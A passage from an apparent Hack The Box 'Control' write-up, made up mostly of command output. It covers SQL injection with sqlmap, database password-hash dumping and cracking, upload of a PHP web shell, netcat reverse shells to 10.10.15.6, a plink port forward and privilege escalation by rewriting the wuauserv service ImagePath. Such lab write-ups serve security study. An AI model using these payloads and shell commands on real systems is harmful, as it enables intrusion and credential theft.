    Type: stacked queries
    Title: MySQL <span class="o">&gt;=</span> 5.0.12 stacked queries <span class="o">(</span>comment<span class="o">)</span>
    Payload: <span class="nv">productName</span><span class="o">=</span>1<span class="s1">';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=1'</span> AND <span class="o">(</span>SELECT 1282 FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span>5<span class="o">)))</span>SjAs<span class="o">)</span><span class="nt">--</span> zlek

    Type: UNION query
    Title: MySQL UNION query <span class="o">(</span>NULL<span class="o">)</span> - 6 columns
    Payload: <span class="nv">productName</span><span class="o">=</span>1<span class="s1">' UNION ALL SELECT NULL,CONCAT(0x71627a7871,0x636c6378616c4145546b6e6170666e67756e467173714862555747786d7065655a637a77504c7347,0x7170627171),NULL,NULL,NULL,NULL#
---
[04:01:08] [INFO] the back-end DBMS is MySQL
[04:01:08] [INFO] fetching banner
web server operating system: Windows 10 or 2016
web application technology: Microsoft IIS 10.0, PHP 7.3.7
back-end DBMS: MySQL &gt;= 5.0
banner: '</span>10.4.8-MariaDB<span class="s1">'
[04:01:08] [INFO] fetching current user
current user: '</span>manager@localhost<span class="s1">'
[04:01:08] [INFO] fetching current database
current database: '</span>warehouse<span class="s1">'
[04:01:08] [INFO] fetching server hostname
hostname: '</span>Fidelity<span class="s1">'
[04:01:08] [INFO] testing if current user is DBA
[04:01:08] [INFO] fetching current user
current user is DBA: False
[04:01:08] [INFO] fetching database users
database management system users [6]:
[*] '</span>hector<span class="s1">'@'</span>localhost<span class="s1">'
[*] '</span>manager<span class="s1">'@'</span>localhost<span class="s1">'
[*] '</span>root<span class="s1">'@'</span>127.0.0.1<span class="s1">'
[*] '</span>root<span class="s1">'@'</span>::1<span class="s1">'
[*] '</span>root<span class="s1">'@'</span>fidelity<span class="s1">'
[*] '</span>root<span class="s1">'@'</span>localhost<span class="s1">'

[04:01:08] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
[04:01:08] [INFO] using hash method '</span>mysql_passwd<span class="s1">'
[04:01:08] [INFO] resuming password '</span>l3tm3!n<span class="s1">' for hash '</span><span class="k">*</span>cfe3eee434b38cbf709ad67a4dcdea476cba7fda<span class="s1">' for user '</span>manager<span class="s1">'
what dictionary do you want to use?
[1] default dictionary file '</span>/usr/share/sqlmap/data/txt/wordlist.tx_<span class="s1">' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
&gt; 1
[04:01:08] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[04:01:08] [INFO] starting dictionary-based cracking (mysql_passwd)
[04:01:08] [INFO] starting 4 processes 
database management system users password hashes:                                                                                                    
[*] hector [1]:
    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
[*] manager [1]:
    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
    clear-text password: l3tm3!n
[*] root [1]:
    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8
</span></pre></table></code></div></div><p>Got a password of the manager user</p><p>then i tried to upload a php file from inidishell <a href="https://github.com/incredibleindishell/Mannu-Shell/blob/master/mannu.php">mannu.php</a></p><p>And uploaded it with sqlmap</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="nv">$sqlmap</span> <span class="nt">-r</span> request.txt <span class="nt">--file-write</span><span class="o">=</span>/home/prashant/Desktop/munna.php <span class="nt">--file-dest</span><span class="o">=</span>C:/inetpub/wwwroot/munna.php
        ___
       __H__
 ___ ___[<span class="o">(]</span>_____ ___ ___  <span class="o">{</span>1.3.11#stable<span class="o">}</span>
|_ -| <span class="nb">.</span> <span class="o">[</span><span class="s2">"]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:21:59 /2020-02-28/

[01:21:59] [INFO] parsing HTTP request from 'request.txt'
[01:22:01] [INFO] resuming back-end DBMS 'mysql' 
[01:22:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-1110' OR 7457=7457#

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=1' AND (SELECT 7362 FROM(SELECT COUNT(*),CONCAT(0x71627a7871,(SELECT (ELT(7362=7362,1))),0x7170627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- QaIn

    Type: stacked queries
    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
    Payload: productName=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=1' AND (SELECT 1282 FROM (SELECT(SLEEP(5)))SjAs)-- zlek

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=1' UNION ALL SELECT NULL,CONCAT(0x71627a7871,0x636c6378616c4145546b6e6170666e67756e467173714862555747786d7065655a637a77504c7347,0x7170627171),NULL,NULL,NULL,NULL#
---
[01:22:02] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 10 or 2016
web application technology: Microsoft IIS 10.0, PHP 7.3.7
back-end DBMS: MySQL &gt;= 5.0
[01:22:02] [INFO] fingerprinting the back-end DBMS operating system
[01:22:02] [INFO] the back-end DBMS operating system is Windows
[01:22:05] [WARNING] potential permission problems detected ('Access denied')
[01:22:54] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)               
do you want confirmation that the local file '/home/prashant/Desktop/munna.php' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/munna.php')? [Y/n] y
[01:25:23] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[01:25:23] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[01:25:24] [INFO] the local file '/home/prashant/Desktop/munna.php' and the remote file 'C:/inetpub/wwwroot/munna.php' have the same size (13191 B)
[01:25:25] [INFO] fetched data logged to text files under '/root/.sqlmap/output/control.htb'
[01:25:25] [WARNING] you haven't updated sqlmap for more than 117 days!!!
</span></pre></table></code></div></div><p>And the file get uploaded successfully</p><p>Now i access it with <code class="language-plaintext highlighter-rouge">control.htb/munna.php</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/mannu.png" alt="alt mannu.php" /></p><p>So, i need to get a powershell shell</p><p>i transfered the nc.exe to the machine using the upload file feature in <code class="language-plaintext highlighter-rouge">mannu.php</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/control/image6.png" alt="alt nc.exe" /></p><p>And next step is to get the shell with nc.exe with the cmd exct feature in mannu.php</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>.\nc.exe -e powershell.exe 10.10.15.6 1234
</pre></table></code></div></div><p>And i got shell</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">┌─[root@parrot]─[/home/prashant/Desktop]
</span><span class="gp">└──╼ #</span>nc <span class="nt">-nlvp</span> 1234
<span class="go">listening on [any] 1234 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.10.167] 55119
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

</span><span class="gp">PS C:\tmp&gt;</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">whoami
nt authority\iusr
</span></pre></table></code></div></div><p>there is one User <code class="language-plaintext highlighter-rouge">Hector</code> and i rememberd the hash of hector we got from the sqlmap So , I decided to decrypt it with john</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌─[root@parrot]─[/home/prashant]
└──╼ #john hash.txt -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 XOP 4x2])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
l33th4x0rhector  (hector)
1g 0:00:00:02 DONE (2020-02-28 06:37) 0.4901g/s 3138Kp/s 3138Kc/s 3138KC/s l33thax0r..l33th4ck3r
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>And we got the password,Since the winrm port was not opened so we cant use evil-winrm</p><p>But when i checked for internal ports , the port <code class="language-plaintext highlighter-rouge">5985 winrm port</code> running locally</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">
</span><span class="nf">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">

</span><span class="nf">Active</span><span class="w"> </span><span class="nx">Connections</span><span class="w">

  </span><span class="nf">Proto</span><span class="w">  </span><span class="nx">Local</span><span class="w"> </span><span class="nx">Address</span><span class="w">          </span><span class="nx">Foreign</span><span class="w"> </span><span class="nx">Address</span><span class="w">        </span><span class="nx">State</span><span class="w">           </span><span class="nx">PID</span><span class="w">
  </span><span class="nf">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:80</span><span class="w">             </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">
  </span><span class="nf">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:135</span><span class="w">            </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">828</span><span class="w">
  </span><span class="nf">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:3306</span><span class="w">           </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">1860</span><span class="w">
  </span><span class="nf">TCP</span><span class="w">    </span><span class="nx">0.0.0.0:5985</span><span class="w">           </span><span class="nx">0.0.0.0:0</span><span class="w">              </span><span class="nx">LISTENING</span><span class="w">       </span><span class="nx">4</span><span class="w">

</span></pre></table></code></div></div><p>So it will be better if i forward the winrm port to my machine and use evil-winrm to login as hector I used plink.exe for this</p><p>Uploaded it to machine,and started ssh service of my machine</p><p>And execute it with the following</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\plink.exe</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">prashant</span><span class="w"> </span><span class="nt">-pw</span><span class="w"> </span><span class="nx">123456</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">5985:127.0.0.1:5985</span><span class="w"> </span><span class="nx">10.10.15.6</span><span class="w">
</span><span class="o">.</span><span class="nf">\plink.exe</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">prashant</span><span class="w"> </span><span class="nt">-pw</span><span class="w"> </span><span class="nx">123456</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">5985:127.0.0.1:5985</span><span class="w"> </span><span class="nx">10.10.15.6</span><span class="w">
</span><span class="o">.</span><span class="nf">\plink.exe</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">The</span><span class="w"> </span><span class="nx">server</span><span class="s1">'s host key is not cached in the registry. You
At line:1 char:1
+ .\plink.exe -l prashant -pw 123456 -R 5985:127.0.0.1:5985 10.10.15.6
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The server'</span><span class="nx">s</span><span class="w"> </span><span class="nx">ho...e</span><span class="w"> </span><span class="nx">registry.</span><span class="w"> </span><span class="nx">You:String</span><span class="p">)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="nf">RemoteException</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">NativeCommandError</span><span class="w">
 
</span><span class="nf">have</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">guarantee</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">computer</span><span class="w"> </span><span class="nx">you</span><span class="w">
</span><span class="nf">think</span><span class="w"> </span><span class="nx">it</span><span class="w"> </span><span class="nx">is.</span><span class="w">
</span><span class="nf">The</span><span class="w"> </span><span class="nx">server</span><span class="s1">'s rsa2 key fingerprint is:
ssh-rsa 2048 05:42:28:0a:c1:3a:97:f9:6a:bf:f9:4a:16:50:0e:d1
If you trust this host, enter "y" to add the key to
PuTTY'</span><span class="nx">s</span><span class="w"> </span><span class="nx">cache</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">carry</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">connecting.</span><span class="w">
</span><span class="kr">If</span><span class="w"> </span><span class="nf">you</span><span class="w"> </span><span class="nx">want</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">carry</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">connecting</span><span class="w"> </span><span class="nx">just</span><span class="w"> </span><span class="nx">once</span><span class="p">,</span><span class="w"> </span><span class="nx">without</span><span class="w">
</span><span class="nf">adding</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">cache</span><span class="p">,</span><span class="w"> </span><span class="nx">enter</span><span class="w"> </span><span class="s2">"n"</span><span class="o">.</span><span class="w">
</span><span class="kr">If</span><span class="w"> </span><span class="nf">you</span><span class="w"> </span><span class="nx">do</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">trust</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">host</span><span class="p">,</span><span class="w"> </span><span class="nx">press</span><span class="w"> </span><span class="nx">Return</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">abandon</span><span class="w"> </span><span class="nx">the</span><span class="w">
</span><span class="nf">connection.</span><span class="w">
</span><span class="nx">Store</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">cache</span><span class="nf">?</span><span class="w"> </span><span class="p">(</span><span class="nx">y/n</span><span class="p">)</span><span class="w"> 
</span><span class="nf">y</span><span class="w">
</span><span class="nx">Linux</span><span class="w"> </span><span class="nx">parrot</span><span class="w"> </span><span class="nx">5.3.0-1parrot1-amd64</span><span class="w"> </span><span class="c">#1 SMP Parrot 5.3.7-1parrot1 (2019-11-04) x86_64</span><span class="w">
 </span><span class="nf">____</span><span class="w">                      </span><span class="nx">_</span><span class="w">     </span><span class="nx">____</span><span class="w">            
</span><span class="o">|</span><span class="w">  </span><span class="nf">_</span><span class="w"> </span><span class="nx">\</span><span class="w"> </span><span class="nx">__</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">__</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">__</span><span class="w"> </span><span class="nx">___</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="nf">_</span><span class="w">  </span><span class="nx">/</span><span class="w"> </span><span class="nx">___</span><span class="o">|</span><span class="w">  </span><span class="nf">___</span><span class="w">  </span><span class="nx">___</span><span class="w"> 
</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="nf">_</span><span class="p">)</span><span class="w"> </span><span class="nf">/</span><span class="w"> </span><span class="nx">_</span><span class="se">` </span><span class="o">|</span><span class="w"> </span><span class="s1">'__| '</span><span class="nf">__/</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">\</span><span class="o">|</span><span class="w"> </span><span class="nf">__</span><span class="o">|</span><span class="w"> </span><span class="nf">\___</span><span class="w"> </span><span class="nx">\</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">\/</span><span class="w"> </span><span class="nx">__</span><span class="o">|</span><span class="w">
</span><span class="o">|</span><span class="w">  </span><span class="nf">__/</span><span class="w"> </span><span class="p">(</span><span class="nf">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="nf">_</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="nf">_</span><span class="w">   </span><span class="nx">___</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="nf">__/</span><span class="w"> </span><span class="p">(</span><span class="nf">__</span><span class="w"> 
</span><span class="o">|</span><span class="nf">_</span><span class="o">|</span><span class="w">   </span><span class="nf">\__</span><span class="p">,</span><span class="nx">_</span><span class="o">|</span><span class="nf">_</span><span class="o">|</span><span class="w">  </span><span class="o">|</span><span class="nf">_</span><span class="o">|</span><span class="w">  </span><span class="nf">\___/</span><span class="w"> </span><span class="nx">\__</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="nf">____/</span><span class="w"> </span><span class="nx">\___</span><span class="o">|</span><span class="nf">\___</span><span class="o">|</span><span class="w">
                                                 



</span><span class="nf">The</span><span class="w"> </span><span class="nx">programs</span><span class="w"> </span><span class="nx">included</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Parrot</span><span class="w"> </span><span class="nx">GNU/Linux</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">free</span><span class="w"> </span><span class="nx">software</span><span class="p">;</span><span class="w">
</span><span class="nf">the</span><span class="w"> </span><span class="nx">exact</span><span class="w"> </span><span class="nx">distribution</span><span class="w"> </span><span class="nx">terms</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">each</span><span class="w"> </span><span class="nx">program</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">described</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w">
</span><span class="nf">individual</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">/usr/share/doc/</span><span class="o">*</span><span class="nx">/copyright.</span><span class="w">

</span><span class="nf">Parrot</span><span class="w"> </span><span class="nx">GNU/Linux</span><span class="w"> </span><span class="nx">comes</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">ABSOLUTELY</span><span class="w"> </span><span class="nx">NO</span><span class="w"> </span><span class="nx">WARRANTY</span><span class="p">,</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">extent</span><span class="w">
</span><span class="nf">permitted</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">applicable</span><span class="w"> </span><span class="nx">law.</span><span class="w">
</span><span class="nf">Last</span><span class="w"> </span><span class="nx">login:</span><span class="w"> </span><span class="nx">Fri</span><span class="w"> </span><span class="nx">Feb</span><span class="w"> </span><span class="nx">28</span><span class="w"> </span><span class="nx">02:42:39</span><span class="w"> </span><span class="nx">2020</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">10.10.10.167</span><span class="w">

</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="w">
</span><span class="o">|</span><span class="nf">H</span><span class="o">|</span><span class="nf">E</span><span class="o">|</span><span class="nf">L</span><span class="o">|</span><span class="nf">L</span><span class="o">|</span><span class="nf">O</span><span class="o">|</span><span class="nf">_</span><span class="o">|</span><span class="nf">P</span><span class="o">|</span><span class="nf">R</span><span class="o">|</span><span class="nf">A</span><span class="o">|</span><span class="nf">S</span><span class="o">|</span><span class="nf">H</span><span class="o">|</span><span class="nf">A</span><span class="o">|</span><span class="nf">N</span><span class="o">|</span><span class="nf">T</span><span class="o">|</span><span class="w">
</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="nf">-</span><span class="o">+</span><span class="w">
</span><span class="err">┌─</span><span class="p">[</span><span class="kt">root</span><span class="err">@</span><span class="kt">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="nf">/home/prashant</span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><p>And now it forwarded the winrm port to my machine I can use evil-winrm now to login as hector</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 127.0.0.1 <span class="nt">-u</span> Hector <span class="nt">-p</span> l33th4x0rhector

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>ector<span class="se">\D</span>ocuments&gt; 
</pre></table></code></div></div><h2 id="usertxt">user.txt</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Hector\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="o">..</span><span class="nx">/Desktop/user.txt</span><span class="w">
</span><span class="nf">d8---------------------------72b</span><span class="w">
</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Hector\Documents</span><span class="err">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><h1 id="privilige-escalation">Privilige escalation</h1><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Hector\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">

</span><span class="nf">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">----------------------</span><span class="w">

</span><span class="nf">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">  
</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span><span class="w">
</span><span class="nf">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
</span></pre></table></code></div></div><p>So, after enumerating very much i figured it out that i can abuse service <code class="language-plaintext highlighter-rouge">wuauserv</code> to get root (got a hint) I need to use <code class="language-plaintext highlighter-rouge">reg add</code> to add the image path of nc.exe to run the nc.exe as admin and get the shell</p><p>I can use <code class="language-plaintext highlighter-rouge">reg add</code> for this</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Hector\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="s2">"HKLM\System\CurrentControlSet\services\wuauserv"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_EXPAND_SZ</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">ImagePath</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="s2">"C:\tmp\nc.exe -e powershell 10.10.15.6 4444"</span><span class="w"> </span><span class="nx">/f</span><span class="w">
</span><span class="nf">The</span><span class="w"> </span><span class="nx">operation</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">

</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Hector\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Start-Service</span><span class="w"> </span><span class="nx">wuauserv</span><span class="w">
</span></pre></table></code></div></div><p>And i got the reverse shell as admin</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">─</span><span class="p">[</span><span class="kt">root</span><span class="err">@</span><span class="kt">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="nf">/home/prashant</span><span class="p">]</span><span class="w">
</span><span class="err">└──╼</span><span class="w"> </span><span class="c">#nc -nlvp 4444</span><span class="w">
</span><span class="kt">listening</span><span class="w"> </span><span class="kt">on</span><span class="w"> </span><span class="p">[</span><span class="kt">any</span><span class="p">]</span><span class="w"> </span><span class="mi">4444</span><span class="w"> </span><span class="o">...</span><span class="w">
</span><span class="kt">connect</span><span class="w"> </span><span class="kt">to</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10.15.6</span><span class="p">]</span><span class="w"> </span><span class="kt">from</span><span class="w"> </span><span class="p">(</span><span class="kt">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10.10.167</span><span class="p">]</span><span class="w"> </span><span class="mi">50508</span><span class="w">
</span><span class="kt">Windows</span><span class="w"> </span><span class="kt">PowerShell</span><span class="w"> 
</span><span class="kt">Copyright</span><span class="w"> </span><span class="p">(</span><span class="nf">C</span><span class="p">)</span><span class="w"> </span><span class="kt">Microsoft</span><span class="w"> </span><span class="no">Corporation.</span><span class="w"> </span><span class="kt">All</span><span class="w"> </span><span class="kt">rights</span><span class="w"> </span><span class="no">reserved.</span><span class="w">

</span><span class="kt">PS</span><span class="w"> </span><span class="nf">C:\Windows\system32</span><span class="err">&gt;</span><span class="w">
